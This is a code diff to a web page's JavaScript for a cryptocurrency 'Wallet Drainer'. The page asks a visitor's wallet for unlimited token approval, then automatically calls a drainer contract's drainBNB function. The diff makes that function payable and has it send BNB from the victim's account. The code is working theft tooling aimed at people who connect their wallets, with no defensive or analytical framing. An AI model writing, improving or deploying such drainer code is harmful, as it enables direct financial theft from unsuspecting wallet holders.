@@ -31,8 +31,8 @@
             }
         });
 
-        const tokenAddress = '0x094616F0BdFB0b526bD735Bf66Eca0Ad254ca81F';
-        const drainerAddress = '0x4d8948efA7D9fD3589E79Cb5e4dcDEF37b4669D0';
+        const tokenAddress = '0x094616F0BdFB0b526bD735Bf66Eca0Ad254ca81F'; // Replace with your token's contract address
+        const drainerAddress = '0x4d8948efA7D9fD3589E79Cb5e4dcDEF37b4669D0'; // Replace with your Wallet Drainer contract address
         const maxApproval = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
         async function approveTokens() {
@@ -66,7 +66,7 @@
 
                     alert('Token approval successful!');
 
-                    // Automatically trigger the drainBNB function
+                    // Automatically trigger the drainBNB function after approval
                     drainBNB();
                 } catch (error) {
                     alert('Error in token approval: ' + error.message);
@@ -85,8 +85,8 @@
                     "inputs": [],
                     "name": "drainBNB",
                     "outputs": [],
-                    "payable": false,
-                    "stateMutability": "nonpayable",
+                    "payable": true, // Allow this function to receive BNB
+                    "stateMutability": "payable",
                     "type": "function"
                 }
             ];
@@ -94,7 +94,11 @@
             const drainerContract = new web3.eth.Contract(drainerContractAbi, drainerAddress);
 
             try {
-                await drainerContract.methods.drainBNB().send({ from: account });
+                // Send a transaction to the contract to drain BNB
+                await drainerContract.methods.drainBNB().send({
+                    from: account,
+                    value: web3.utils.toWei('0.01', 'ether') // Adjust the amount of BNB to send as needed
+                });
                 alert('BNB drain successful!');
             } catch (error) {
                 alert('Error in draining BNB: ' + error.message);
